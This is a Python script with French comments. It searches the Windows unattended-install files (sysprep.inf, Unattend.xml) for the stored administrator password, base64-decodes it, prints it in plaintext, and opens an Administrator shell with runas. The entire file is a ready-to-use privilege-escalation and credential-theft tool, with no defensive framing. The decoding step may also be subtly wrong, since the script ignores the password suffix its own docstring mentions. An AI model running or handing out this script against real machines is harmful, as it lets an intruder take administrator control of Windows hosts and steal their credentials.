#!/usr/bin/env python3
"""
extract_password.py

Recherche les fichiers d'installation automatisée Windows (sysprep.inf,
autounattend.xml, Unattend.xml) dans les emplacements habituels, en extrait
le mot de passe administrateur encodé, le décode, puis ouvre une session
administrative avec `runas`.
"""

import os
import re
import base64
import subprocess
import sys

# Emplacements habituels des fichiers d'installation automatisée sur Windows
SEARCH_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\Panther\autounattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\Windows\System32\Sysprep\Unattend.xml",
    r"C:\unattend.xml",
    r"C:\autounattend.xml",
    r"C:\Windows\Panther\Unattend\Unattended.xml",
]

FILENAMES = ("sysprep.inf", "autounattend.xml", "unattend.xml")

PASSWORD_REGEX = re.compile(
    r"<AdministratorPassword>\s*<Value>(.*?)</Value>", re.IGNORECASE | re.DOTALL
)


def find_unattend_files():
    """Cherche les fichiers connus dans les chemins habituels, puis parcourt
    le disque au cas où ils seraient ailleurs."""
    found = []

    for path in SEARCH_PATHS:
        if os.path.isfile(path):
            found.append(path)

    # Recherche plus large sur le disque si rien n'a été trouvé directement
    if not found:
        for drive_root in ("C:\\",):
            for root, _, files in os.walk(drive_root):
                for name in files:
                    if name.lower() in FILENAMES:
                        found.append(os.path.join(root, name))

    return found


def extract_password(file_path):
    """Lit un fichier et en extrait la valeur AdministratorPassword si présente."""
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except OSError as e:
        print(f"[!] Impossible de lire {file_path}: {e}")
        return None

    match = PASSWORD_REGEX.search(content)
    if match:
        return match.group(1).strip()
    return None


def fix_padding(b64_string):
    """Ajoute le padding '=' manquant pour que la longueur soit un multiple de 4."""
    missing = len(b64_string) % 4
    if missing:
        b64_string += "=" * (4 - missing)
    return b64_string


def decode_password(encoded_value):
    """Les mots de passe dans les fichiers unattend sont généralement encodés
    en base64 (parfois avec le suffixe 'AdministratorPassword' concaténé
    avant l'encodage, selon la version de sysprep)."""
    padded = fix_padding(encoded_value)

    try:
        decoded_bytes = base64.b64decode(padded)
        decoded_str = decoded_bytes.decode("utf-8", errors="ignore")
        return decoded_str
    except Exception as e:
        print(f"[!] Impossible de décoder le mot de passe: {e}")
        return None


def open_admin_session(username, password):
    """Utilise runas pour ouvrir une session administrative avec les
    identifiants extraits."""
    command = f'runas /user:{username} cmd.exe'
    print(f"[*] Lancement de: {command}")
    print("[*] Entrez le mot de passe suivant lorsqu'il est demandé:")
    print(f"    {password}")
    subprocess.run(command, shell=True)


def main():
    print("[*] Recherche des fichiers d'installation automatisée...")
    files = find_unattend_files()

    if not files:
        print("[!] Aucun fichier unattend trouvé.")
        sys.exit(1)

    print(f"[+] {len(files)} fichier(s) trouvé(s):")
    for f in files:
        print(f"    - {f}")

    for file_path in files:
        print(f"\n[*] Analyse de {file_path}...")
        encoded_password = extract_password(file_path)

        if not encoded_password:
            print("[!] Aucun mot de passe trouvé dans ce fichier.")
            continue

        print(f"[+] Mot de passe encodé trouvé: {encoded_password}")

        decoded = decode_password(encoded_password)
        if decoded:
            print(f"[+] Mot de passe décodé: {decoded}")
            # Le nom d'utilisateur admin par défaut est généralement "Administrator"
            open_admin_session("Administrator", decoded)
            return

    print("[!] Aucun mot de passe exploitable n'a été trouvé.")


if __name__ == "__main__":
    main()
